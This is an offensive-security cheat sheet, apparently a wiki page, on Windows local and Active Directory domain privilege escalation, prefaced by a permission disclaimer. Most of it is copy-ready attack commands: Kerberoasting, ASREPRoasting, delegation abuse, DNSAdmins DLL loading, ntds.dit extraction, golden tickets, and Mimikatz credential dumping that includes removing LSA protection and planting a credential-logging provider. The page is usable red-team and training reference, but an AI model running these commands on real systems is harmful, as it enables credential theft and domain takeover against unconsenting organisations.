# Privilege Escalation

{% hint style="success" %}
**Hack Responsibly.**

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

## Local Privilege Escalation

* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
* [BeRoot](https://github.com/AlessandroZ/BeRoot) General Privilege Escalation Enumeration Tool
* [Privesc](https://github.com/enjoiz/Privesc) General Privilege Escalation Enumeration Tool
* [FullPowers](https://github.com/itm4n/FullPowers) Restore a service account's privileges
*   [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse `SeImpersonate` or `SeAssignPrimaryToken` Privileges for System Impersonation

    ⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803
*   [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato

    ⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803
*   [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation

    🙏 Works for Windows Server 2019 and Windows 10
*   [RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato

    🙏 Works for Windows Server 2019 and Windows 10
* [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
* [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) [PoC](https://github.com/danigargu/CVE-2020-0796)



## Domain Privilege Escalation

### Kerberoast

_All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"_\
_account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline._

#### Using PowerView:

```powershell
#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN

#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast

#Requesting the TGS for a single account:
Request-SPNTicket

#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### Using PowerShell AD Module:

```powershell
#Get User Accounts that are used as Service Accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### Using Impacket:

```python
python GetUserSPNs.py $DomainName/$DomainUser:$Password -outputfile $Out_File
```

#### Using Rubeus:

```
#Kerberoasting and outputing on a file with a spesific format
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName

#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /rc4opsec

#Kerberoast AES enabled accounts
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /aes

#Kerberoast spesific user account
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /user:$UserName /simple

#Kerberoast by specifying the authentication credentials 
Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /creduser:$UserName> /credpassword:$Password>
```

### ASREPRoast

_If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted_\
_blob and bruteforce it offline._

* PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
* AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Forcefully Disable Kerberos Preauth on an account I have Write permissions or more! Check for interesting permissions on accounts:

{% hint style="info" %}
We add a filter (e.g. RDPUsers) to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!
{% endhint %}

#### Using PowerView:

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

#Disable Kerberos Preauth:
Set-DomainObject -Identity $UserAccount -XOR @{useraccountcontrol=4194304} -Verbose

#Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```

And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.

```powershell
#Get a specific Account's hash:
Get-ASREPHash -UserName $UserName -Verbose

#Get any ASREPRoastable Users' hashes:
Invoke-ASREPRoast -Verbose
```

#### Using Rubeus:

```
#For $Format choose either hashcat or john

#Trying the attack for all domain users
Rubeus.exe asreproast /format:$Format /domain:$DomainName /outfile:$Out_File

#ASREPRoast a specific user
Rubeus.exe asreproast /user:$UserName /format:$Format /domain:$DomainName /outfile:$Out_File

#ASREPRoast users of a specific OU (Organization Unit)
Rubeus.exe asreproast /ou:$OU_Name /format:$Format /domain:$DomainName /outfile:$Out_File
```

#### Using Impacket:

```python
#Trying the attack for the specified users on the file
python GetNPUsers.py $DomainName/ -usersfile $Users_File -outputfile $Out_File
```

### Password Spray Attack

If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse on other domain accounts.

### **Tools:**

* [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
* [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
* [Spray](https://github.com/Greenwolf/Spray)

### Force Set SPN

_If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and brute force it._

#### Using PowerView:

```powershell
#Check for interesting permissions on accounts:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

#Check if current user has already an SPN setted:
Get-DomainUser -Identity $UserName | select serviceprincipalname

#Force set the SPN on the account:
Set-DomainObject $UserName -Set @{serviceprincipalname='ops/whatever1'}
```

#### Using PowerShell AD Module:

```powershell
#Check if current user has already an SPN setted
Get-ADUser -Identity $UserName -Properties ServicePrincipalName | select ServicePrincipalName

#Force set the SPN on the account:
Set-ADUser -Identiny $UserName -ServicePrincipalNames @{Add='ops/whatever1'}
```

Finally use any tool from before to grab the hash and Kerberoast it!

### Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.

```
#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

#List shadow copies using diskshadow
diskshadow list shadows all

#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1. You can dump the backed-up SAM database and harvest credentials.
2. Look for DPAPI stored creds and decrypt them.
3. Access backed-up sensitive files.

### List and Decrypt Stored Credentials using Mimikatz

Usually encrypted credentials are stored in:

* `%appdata%\Microsoft\Credentials`
* `%localappdata%\Microsoft\Credentials`

```
#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\$CredHash"

#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\$UserSID\$MasterKeyGUID"

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\$UserSID\$MasterKeyGUID" /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\$CredHash"
```

Detailed Article: [DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-\~-credential-manager-saved-credentials)

### Unconstrained Delegation

_If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a high value target or DA to connect to it, steal his TGT then ptt and impersonate him!_

Using PowerView:

```powershell
#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName $ComputerName -Poll $Num_Seconds -UserName $UserName -Delay $WaitInterval -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt $Ticket_Path"'
```

**Note:** We can also use Rubeus!

### Constrained Delegation

Using PowerView and Kekeo:

```powershell
#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

After enumeration, request the TGT using kekeo

```
#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:$UserName /domain:$Domain_FQDN /rc4:$Password_Hash

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:$TGT_Path /user:$UserToImpersonate@$Domain_FQDN /service:$Service_SPN

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt $TGS_Path"'
```

_ALTERNATIVE:_ Using Rubeus:

```
Rubeus.exe s4u /user:$UserName /rc4:$NTLM_Hash /impersonateuser:$UserToImpersonate /msdsspn:"$Service_SPN" /altservice:<Optional> /ptt
```

Now we can access the service as the impersonated user!

🚩 **What if we have delegation rights for only a specific SPN? (e.g TIME):**

In this case we can still abuse a feature of Kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. That gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

### Resource Based Constrained Delegation

_If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._

Tools we are going to use:

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
* [Powermad](https://github.com/Kevin-Robertson/Powermad)
* [Rubeus](https://github.com/GhostPack/Rubeus)

First we need to enter the security context of the user/machine account that has the privileges over the object. If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.

Exploitation Example:

```powershell
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount $MachineAccountName -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer $MachineAccountName -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

After that we need to get the RC4 hash of the new machine account's password using Rubeus

```
Rubeus.exe hash /password:'p@ssword!'

#TODO: Fix these last two examples (Domain and computername needed?)
#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:$MachineAccountName /rc4:$RC4HashOfMachineAccountPassword /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:$Domain_FQDN /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

Detailed Articles:

* [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

❗ In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED\_TO\_AUTH\_FOR\_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.

```
#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap
```

Detailed Article: [Rubeus – Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

### DNSAdmins Abuse

_If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._

1. Enumerate the members of the DNSAdmins group:
   * PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
   * AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
2. Once we found a member of this group we need to compromise it (There are many ways).
3.  Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:

    ```
    #Using dnscmd:
    dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

    #Restart the DNS Service:
    sc \\DNSServer stop dns
    sc \\DNSServer start dns
    ```

### Abusing Active Directory-Integrated DNS

* [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
* [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
* [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

### Abusing Backup Operators Group

_If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._

Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:

1. Create a .txt file that will contain the shadow copy process script

```
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  

create  

expose %mydrive% w:  
end backup
```

&#x20;2\. Next, Execute diskshadow with our script as a parameter

```
diskshadow /s script.txt
```

&#x20;3\. Next, you need to access the shadow copy.  even if you have the `SeBackupPrivilege` you cannot simply copy `ntds.dit`.  You will need to mimic backup software and use Win32 API calls to copy it on an accessible folder.  For this we are going to build a malicious dll from [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo and use it to abuse `SeBackupPrivilege`.&#x20;

```powershell
#Importing both dlls from the repo using powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

#Checking if the SeBackupPrivilege is enabled
Get-SeBackupPrivilege

#If it isn't we enable it
Set-SeBackupPrivilege

#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

#Dump the SYSTEM hive
reg save HKLM\SYSTEM c:\temp\system.hive
```

&#x20;4\. Using `smbclient.py` from impacket or some other tool copy `ntds.dit` and the SYSTEM hive to your local machine.

&#x20;5\. Use `secretsdump.py` from impacket and dump the hashes.

&#x20;6\. Use `psexec` or another tool of your choice to pass-the-hash and get Domain Admin access.

### Abusing Exchange

* [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
* [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
* [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange

### Weaponizing Printer Bug

* [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
* [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

### Abusing ACLs

* [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [aclpwn.py](https://github.com/fox-it/aclpwn.py)
* [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

### Abusing IPv6 with mitm6

* [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
* [mitm6](https://github.com/fox-it/mitm6)

### SID History Abuse

_If we manage to compromise a child domain of a forest and_ [_SID filtering_](https://www.itprotoday.com/windows-8/sid-filtering) _isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the_ [_SID History_](https://www.itprotoday.com/windows-8/sid-history) _field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._

Exploitation example:

```
#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
```

Detailed Articles:

* [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
* [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

### Exploiting SharePoint

* [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation [PoC](https://github.com/k8gege/CVE-2019-0604)
* [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Code execution through BDC deserialization
* [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

### Zerologon Exploit

* [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/pathtoimg.php?id=2055): White paper of the vulnerability.
* [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C# implementation of the Zerologon exploit.
* [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): Powershell implementation of the Zerologon exploit.
* [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.

## Mimikatz

```bash
#The commands below are shown in Cobalt Strike format

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:$UserName /ntlm:$NTLM_Hash /domain:$Domain_FQDN

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:$Domain_FQDN /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt $KirbiFile_Path

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

If mimikatz fails to dump credentials because of LSA Protection controls, there are two workarounds:

### LSA as a Protected Process

```
#Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
#Now lets import the mimidriver.sys to the system
mimikatz # !+

#Now lets remove the protection flags from lsass.exe process
mimikatz # !processprotect /process:lsass.exe /remove

#Finally run the logonpasswords function to dump lsass
mimikatz # sekurlsa::logonpasswords
```

### LSA is running as virtualized process (LSAISO) by Credential Guard

First, check if a process called `lsaiso.exe` is running.&#x20;

```
tasklist | findstr lsaiso
```

If lsaiso.exe is running there isn't a way to dump lsass, as we will only get encrypted data. However, you can still use keyloggers or clipboard dumpers to capture data. For example, you can use the malicious Security Support Provider provided by mimikatz.

```
mimikatz # misc::memssp
```

Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into `c:\windows\system32\mimilsa.log`

* [Detailed Mimikatz Guide](https://adsecurity.org/?page\_id=1821)
* [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)
